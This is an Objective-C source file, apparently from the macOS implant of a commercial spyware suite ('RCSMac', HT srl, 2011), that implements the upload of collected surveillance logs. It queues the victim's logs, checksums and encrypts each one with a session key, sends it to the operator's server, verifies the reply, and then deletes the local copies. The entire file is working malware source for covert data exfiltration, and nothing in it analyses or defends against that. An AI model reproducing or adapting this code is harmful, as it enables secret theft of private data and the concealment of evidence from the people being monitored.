/*
 * RCSMac - Log Upload Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "LogNetworkOperation.h"

#import "LogNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "FSNetworkOperation.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"

#import "NSString+SHA1.h"
#import "NSData+SHA1.h"

#import "RCSICommon.h"
//#import "RCSMLogger.h"
//#import "RCSMDebug.h"


@interface LogNetworkOperation (private)

- (BOOL)_sendLogContent: (NSData *)aLogData;

@end

@implementation LogNetworkOperation (private)

- (BOOL)_sendLogContent: (NSData *)aLogData
{
#ifdef DEBUG_LOG_NOP
  infoLog(@"");
#endif
  
  if (aLogData == nil)
    {
#ifdef DEBUG_LOG_NOP
      errorLog(@"aLogData is nil");
#endif
      
      return NO;
    }
  
  uint32_t command              = PROTO_LOG;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  
  //
  // message = PROTO_LOG | log_size | log_content | sha
  //
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  uint32_t dataSize             = [aLogData length];
  [commandData appendBytes: &dataSize
                    length: sizeof(uint32_t)];
  [commandData appendData: aLogData];
  
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];
  
#ifdef DEBUG_LOG_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil)
    {
#ifdef DEBUG_LOG_NOP
      errorLog(@"empty reply from server");
#endif
      [commandData release];
      [outerPool release];
    
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_LOG_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_LOG_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_LOG_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_LOG_NOP
      errorLog(@"sha mismatch");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
   
  if (command != PROTO_OK)
    {
#ifdef DEBUG_LOG_NOP
      errorLog(@"Server issued a PROTO_%d", command);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}

@end


@implementation LogNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      
#ifdef DEBUG_LOG_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{
#ifdef DEBUG_LOG_NOP
  infoLog(@"");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  id anObject;
  
  RCSILogManager *logManager = [RCSILogManager sharedInstance];

  //
  // Logs to the send queue
  //
  if ([logManager closeActiveLogsAndContinueLogging: TRUE] == YES)
    {
#ifdef DEBUG_LOG_NOP
      infoLog(@"Active logs closed correctly");
#endif
    }
  else
    {
#ifdef DEBUG_LOG_NOP
      errorLog(@"An error occurred while closing active logs (non-fatal)");
#endif
    }

  int logCount = [logManager getSendLogItemCount];
  
  NSMutableIndexSet *sendedItem  = [NSMutableIndexSet indexSet];
  
  //
  // Send all the logs in the send queue
  //
  for (int i=0; i < logCount; i++)
    {
      anObject = [logManager getSendLogItemAtIndex:i];
      
      if (anObject == nil)
        continue;
        
      NSString *logName = [anObject objectForKey: @"logName"];

      if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
        {
          NSData *logContent  = [NSData dataWithContentsOfFile: logName];

          if ([self _sendLogContent: logContent] == YES)
            {
              [sendedItem addIndex:i];
              if ([[NSFileManager defaultManager] removeItemAtPath: logName
                                                         error: nil] == NO)
                {
#ifdef DEBUG_LOG_NOP
                errorLog(@"Error while removing (%@) from fs", logName);
#endif
                }
            }
        }
    }
  
  [logManager clearSendLogQueue: sendedItem];
  
  [outerPool release];
  
  return YES;
}
  
@end
